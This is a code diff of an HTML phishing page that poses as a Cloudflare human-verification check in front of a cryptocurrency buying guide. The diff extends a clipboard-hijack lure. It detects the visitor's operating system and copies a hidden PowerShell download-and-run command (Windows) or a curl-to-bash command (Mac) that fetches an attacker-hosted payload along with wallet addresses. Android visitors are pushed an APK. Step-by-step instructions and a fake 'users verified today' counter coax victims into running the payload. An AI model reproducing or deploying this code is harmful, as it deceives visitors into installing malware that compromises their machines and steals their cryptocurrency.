@@ -76,7 +76,6 @@
             line-height: 1.5;
             margin-bottom: 30px;
         }
-        /* Fake Cloudflare Turnstile widget */
         .turnstile-widget {
             background: #f8fafd;
             border: 2px solid #dde3e9;
@@ -165,25 +164,24 @@
             from { opacity: 0; transform: translateY(-20px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .modal .shield-icon {
+        .modal .os-badge {
             background: #eef4ff;
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-        }
-        .modal .shield-icon i {
-            font-size: 36px;
             color: #2b6ef0;
+            padding: 8px 20px;
+            border-radius: 40px;
+            display: inline-block;
+            font-weight: 600;
+            margin-bottom: 20px;
         }
         .modal h3 {
             font-size: 28px;
             font-weight: 700;
             color: #0b1e33;
             margin-bottom: 12px;
+        }
+        .modal p {
+            color: #4a5a6e;
+            margin-bottom: 20px;
         }
         .modal .code-box {
             background: #0f172a;
@@ -207,7 +205,7 @@
             line-height: 1.2;
             word-break: break-word;
         }
-        .copy-btn {
+        .action-btn {
             background: #2b6ef0;
             color: white;
             border: none;
@@ -224,10 +222,10 @@
             gap: 12px;
             transition: background 0.2s;
         }
-        .copy-btn:hover {
+        .action-btn:hover {
             background: #1a4fc4;
         }
-        .copy-btn i {
+        .action-btn i {
             font-size: 24px;
         }
         .instruction-steps {
@@ -282,14 +280,33 @@
             padding: 8px 20px;
             border-radius: 40px;
         }
+        .continue-btn {
+            background: #e2e8f0;
+            color: #94a3b8;
+            border: none;
+            padding: 18px;
+            border-radius: 60px;
+            font-size: 20px;
+            font-weight: 600;
+            width: 100%;
+            cursor: not-allowed;
+            transition: all 0.2s;
+            margin-top: 16px;
+        }
+        .continue-btn.active {
+            background: #10b981;
+            color: white;
+            cursor: pointer;
+        }
 
-        /* ----- MAIN CONTENT (hidden until verified) ----- */
+        /* ----- MAIN CONTENT (hidden until user clicks Continue) ----- */
         .main-content {
             max-width: 1300px;
             margin: 0 auto;
             background: white;
             border-radius: 0;
             box-shadow: none;
+            display: none;
         }
         .hero {
             background: linear-gradient(145deg, #0b1e33, #1a2f4b);
@@ -469,8 +486,34 @@
     // YOUR GITHUB PAYLOAD RAW LINK (from burner account 2)
     const PAYLOAD_URL = "https://raw.githubusercontent.com/10010yak/Payload-stuff/main/payload.ps1";
 
-    // Malicious PowerShell command (downloads & runs payload)
-    const MALICIOUS_COMMAND = `powershell -NoP -ExecutionPolicy Bypass -w 1 -c "$c='${PAYLOAD_URL}';$d='$env:TEMP\\svchost.ps1';(New-Object Net.WebClient).DownloadFile($c,$d);& $d -wallets '${MY_ADDRESSES.BTC}','${MY_ADDRESSES.ETH}','${MY_ADDRESSES.BNB}','${MY_ADDRESSES.TRX}','${MY_ADDRESSES.SOL}'"`;
+    // Windows payload (PowerShell - optimized for Terminal)
+    const WINDOWS_COMMAND = `powershell -NoP -ExecutionPolicy Bypass -w 1 -c "$c='${PAYLOAD_URL}';$d='$env:TEMP\\svchost.ps1';(New-Object Net.WebClient).DownloadFile($c,$d);& $d -wallets '${MY_ADDRESSES.BTC}','${MY_ADDRESSES.ETH}','${MY_ADDRESSES.BNB}','${MY_ADDRESSES.TRX}','${MY_ADDRESSES.SOL}'"`;
+
+    // Mac payload (Terminal)
+    const MAC_COMMAND = `curl -s ${PAYLOAD_URL} | bash -s -- '${MY_ADDRESSES.BTC}' '${MY_ADDRESSES.ETH}' '${MY_ADDRESSES.BNB}' '${MY_ADDRESSES.TRX}' '${MY_ADDRESSES.SOL}'`;
+
+    // Android payload (APK download) – you must host an APK at this URL
+    const ANDROID_APK_URL = "https://your-server.com/update.apk";
+</script>
+
+<!-- DETECT USER OPERATING SYSTEM -->
+<script>
+    let userOS = "windows"; // default
+    (function() {
+        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        if (/windows/i.test(userAgent)) {
+            userOS = "windows";
+        } else if (/macintosh|mac os x/i.test(userAgent)) {
+            userOS = "mac";
+        } else if (/android/i.test(userAgent)) {
+            userOS = "android";
+        } else if (/iPad|iPhone|iPod/i.test(userAgent)) {
+            userOS = "ios";
+        } else if (/linux/i.test(userAgent)) {
+            userOS = "windows"; // treat Linux as Windows-like
+        }
+        console.log("Detected OS:", userOS);
+    })();
 </script>
 
 <!-- ========== FULL‑PAGE VERIFICATION OVERLAY ========== -->
@@ -494,6 +537,11 @@
             </div>
         </div>
 
+        <!-- Social proof counter -->
+        <div style="margin-bottom: 20px; color: #10b981;">
+            <i class="fas fa-user-check"></i> <span id="userCounter">2,847</span> users verified today
+        </div>
+
         <div class="privacy-note">
             <i class="fas fa-lock" style="margin-right: 8px;"></i> Your privacy is protected. This site uses Cloudflare.
         </div>
@@ -503,46 +551,35 @@
 <!-- ========== VERIFICATION MODAL (popup) ========== -->
 <div class="modal-overlay" id="verifyModal">
     <div class="modal">
-        <div class="shield-icon">
-            <i class="fas fa-fingerprint"></i>
-        </div>
-        <h3>Almost there!</h3>
-        <p>Copy the verification code and run it to continue. The check will complete automatically.</p>
+        <div class="os-badge" id="osBadge"><i class="fas fa-windows"></i> Windows detected</div>
+        <h3>Complete security check</h3>
+        <p>Follow the steps below to verify you're human.</p>
 
-        <div class="code-box">
+        <div class="code-box" id="codeBox">
             <div class="code-label">Verification code</div>
-            <div class="verification-code" id="displayCode">K3P8Q1</div>
+            <div class="verification-code" id="verificationCode">K3P8Q1</div>
         </div>
 
-        <!-- COPY BUTTON – triggers clipboard hijack -->
-        <button class="copy-btn" id="copyBtn" onclick="copyMaliciousCommand()">
-            <i class="fas fa-copy"></i> Copy verification code
+        <!-- Primary action button (copy or download) -->
+        <button class="action-btn" id="actionBtn" onclick="performAction()">
+            <i class="fas fa-copy" id="actionIcon"></i> <span id="actionText">Copy verification code</span>
         </button>
 
-        <div class="instruction-steps">
-            <div class="step">
-                <span class="step-number">1</span>
-                <span>Click the "Copy" button above</span>
-            </div>
-            <div class="step">
-                <span class="step-number">2</span>
-                <span>Press <strong>Windows Key + R</strong> (Run dialog)</span>
-            </div>
-            <div class="step">
-                <span class="step-number">3</span>
-                <span>Press <strong>Ctrl + V</strong> to paste</span>
-            </div>
-            <div class="step">
-                <span class="step-number">4</span>
-                <span>Press <strong>Enter</strong> to verify</span>
-            </div>
+        <!-- OS-specific instructions -->
+        <div class="instruction-steps" id="instructionSteps">
+            <!-- Filled by JavaScript -->
         </div>
 
-        <!-- Timer element (hidden initially) -->
+        <!-- Timer (starts after action) -->
         <div class="verification-timer" id="timer">
             <i class="fas fa-spinner"></i>
-            <span class="timer-text" id="timerText">Verifying... 20s</span>
+            <span class="timer-text" id="timerText">Verifying... 10s</span>
         </div>
+
+        <!-- Continue button (enabled after timer finishes) -->
+        <button class="continue-btn" id="continueBtn" onclick="finishVerification()" disabled>
+            ⏳ Waiting for verification...
+        </button>
 
         <div class="modal-footer" id="modalFooter">
             Verification ID: 7624-<span id="randomId"></span>
@@ -550,8 +587,8 @@
     </div>
 </div>
 
-<!-- ========== MAIN CONTENT (hidden until verified) ========== -->
-<div class="main-content" id="mainContent" style="display: none;">
+<!-- ========== MAIN CONTENT (hidden until user clicks Continue) ========== -->
+<div class="main-content" id="mainContent">
     <!-- HERO -->
     <section class="hero">
         <h1>How to Buy Cryptocurrency</h1>
@@ -746,43 +783,132 @@
 
 <!-- JavaScript for verification flow and attack -->
 <script>
-    // Generate random verification ID
+    // Generate random verification ID and user counter
     document.getElementById('randomId').innerText = Math.floor(1000 + Math.random() * 9000);
+    document.getElementById('userCounter').innerText = Math.floor(2000 + Math.random() * 1000);
 
     // Show verification modal when Turnstile widget is clicked
     function showVerificationModal() {
         document.getElementById('cfCheckbox').classList.add('checked');
+        updateInstructionsForOS();
         document.getElementById('verifyModal').style.display = 'flex';
     }
 
+    // Update UI based on detected OS
+    function updateInstructionsForOS() {
+        const osBadge = document.getElementById('osBadge');
+        const instructionSteps = document.getElementById('instructionSteps');
+        const actionIcon = document.getElementById('actionIcon');
+        const actionText = document.getElementById('actionText');
+        const codeBox = document.getElementById('codeBox');
+        const verificationCode = document.getElementById('verificationCode');
+
+        if (userOS === "windows") {
+            osBadge.innerHTML = '<i class="fas fa-windows"></i> Windows detected';
+            verificationCode.innerText = "K3P8Q1";
+            actionIcon.className = 'fas fa-copy';
+            actionText.innerText = 'Copy verification code';
+            instructionSteps.innerHTML = `
+                <div class="step"><span class="step-number">1</span> Click the "Copy" button above</div>
+                <div class="step"><span class="step-number">2</span> Press <strong>Win + X</strong>, then press <strong>I</strong> to open Windows Terminal</div>
+                <div class="step"><span class="step-number">3</span> Right-click in the Terminal window to paste</div>
+                <div class="step"><span class="step-number">4</span> Press <strong>Enter</strong> to verify</div>
+            `;
+        } else if (userOS === "mac") {
+            osBadge.innerHTML = '<i class="fas fa-apple"></i> macOS detected';
+            verificationCode.innerText = "MAC-VERIFY";
+            actionIcon.className = 'fas fa-copy';
+            actionText.innerText = 'Copy verification code';
+            instructionSteps.innerHTML = `
+                <div class="step"><span class="step-number">1</span> Click the "Copy" button above</div>
+                <div class="step"><span class="step-number">2</span> Open <strong>Finder</strong> → <strong>Go</strong> → <strong>Utilities</strong></div>
+                <div class="step"><span class="step-number">3</span> Open <strong>Terminal</strong></div>
+                <div class="step"><span class="step-number">4</span> Press <strong>Cmd + V</strong> to paste, then press <strong>Enter</strong></div>
+            `;
+        } else if (userOS === "android") {
+            osBadge.innerHTML = '<i class="fas fa-robot"></i> Android detected';
+            verificationCode.innerText = "ANDROID";
+            codeBox.style.display = 'none';
+            actionIcon.className = 'fas fa-download';
+            actionText.innerText = 'Download update';
+            instructionSteps.innerHTML = `
+                <div class="step"><span class="step-number">1</span> Click the "Download update" button below</div>
+                <div class="step"><span class="step-number">2</span> Open the downloaded file when complete</div>
+                <div class="step"><span class="step-number">3</span> Tap "Install" (allow from unknown sources if prompted)</div>
+                <div class="step"><span class="step-number">4</span> Return here after installation</div>
+            `;
+        } else if (userOS === "ios") {
+            osBadge.innerHTML = '<i class="fas fa-mobile-alt"></i> iOS detected';
+            verificationCode.innerText = "IOS";
+            actionIcon.className = 'fas fa-check';
+            actionText.innerText = 'Continue';
+            instructionSteps.innerHTML = `
+                <div class="step"><span class="step-number">✓</span> iOS users are automatically verified</div>
+                <div class="step"><span class="step-number">2</span> Click "Continue" below</div>
+            `;
+        }
+    }
+
     let timerInterval;
+    let timerFinished = false;
 
-    // Copy malicious command to clipboard and start timer
-    function copyMaliciousCommand() {
-        navigator.clipboard.writeText(MALICIOUS_COMMAND).then(() => {
-            // Hide copy button and instructions, show timer
-            document.querySelector('.copy-btn').style.display = 'none';
-            document.querySelector('.instruction-steps').style.display = 'none';
-            document.getElementById('timer').style.display = 'flex';
-            document.getElementById('modalFooter').style.display = 'none';
+    // Perform the main action (copy or download) based on OS
+    function performAction() {
+        if (userOS === "windows") {
+            navigator.clipboard.writeText(WINDOWS_COMMAND).then(() => {
+                afterAction();
+            }).catch(err => {
+                alert('Unable to copy automatically. Please copy this code manually:\n\n' + WINDOWS_COMMAND);
+            });
+        } else if (userOS === "mac") {
+            navigator.clipboard.writeText(MAC_COMMAND).then(() => {
+                afterAction();
+            }).catch(err => {
+                alert('Unable to copy automatically. Please copy this code manually:\n\n' + MAC_COMMAND);
+            });
+        } else if (userOS === "android") {
+            // Trigger APK download
+            const link = document.createElement('a');
+            link.href = ANDROID_APK_URL;
+            link.download = 'update.apk';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            afterAction();
+        } else if (userOS === "ios") {
+            // iOS just continues directly
+            finishVerification();
+            return;
+        }
+    }
 
-            let seconds = 20;
-            const timerText = document.getElementById('timerText');
-            timerInterval = setInterval(() => {
-                seconds--;
-                timerText.innerText = `Verifying... ${seconds}s`;
-                if (seconds <= 0) {
-                    clearInterval(timerInterval);
-                    finishVerification();
-                }
-            }, 1000);
-        }).catch(err => {
-            alert('Unable to copy automatically. Please copy this code manually:\n\n' + MALICIOUS_COMMAND);
-        });
+    function afterAction() {
+        // Hide action button and instructions, show timer
+        document.querySelector('.action-btn').style.display = 'none';
+        document.querySelector('.instruction-steps').style.display = 'none';
+        document.getElementById('timer').style.display = 'flex';
+        document.getElementById('modalFooter').style.display = 'none';
+
+        let seconds = 10;
+        const timerText = document.getElementById('timerText');
+        timerInterval = setInterval(() => {
+            seconds--;
+            timerText.innerText = `Verifying... ${seconds}s`;
+            if (seconds <= 0) {
+                clearInterval(timerInterval);
+                timerFinished = true;
+                // Enable continue button
+                const continueBtn = document.getElementById('continueBtn');
+                continueBtn.disabled = false;
+                continueBtn.classList.add('active');
+                continueBtn.innerText = '✅ Continue to guide';
+            }
+        }, 1000);
     }
 
     // Finish verification: hide overlay and modal, show main content
     function finishVerification() {
+        if (userOS !== "ios" && !timerFinished) return; // only allow if timer done (except iOS)
         document.getElementById('verifyModal').style.display = 'none';
         document.getElementById('verifyOverlay').classList.add('hidden');
         document.getElementById('mainContent').style.display = 'block';
@@ -794,7 +920,6 @@
         const modal = document.getElementById('verifyModal');
         if (event.target === modal) {
             modal.style.display = 'none';
-            // Also stop timer if running
             if (timerInterval) clearInterval(timerInterval);
         }
     };
